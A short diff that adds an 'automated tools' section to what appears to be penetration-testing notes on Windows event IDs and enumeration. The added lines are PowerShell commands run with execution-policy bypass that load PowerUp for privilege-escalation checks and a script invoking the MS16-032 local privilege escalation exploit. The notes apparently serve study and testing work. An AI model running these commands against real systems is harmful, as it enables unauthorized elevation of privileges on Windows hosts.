@@ -128,6 +128,11 @@ Microsoft Event IDs (Some Important Ones)
 4672 administrator equivalent user logs on
 7045 Service creation
 wmic neteventlog get name
+
+automated tools
+         powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }" 
+         powershell -exec bypass -command "& { Import-Module .\39719.ps1; Invoke-MS16-032; }" 
+
                          
 3.	Enumeration tools
 3.1.	Nmap: 
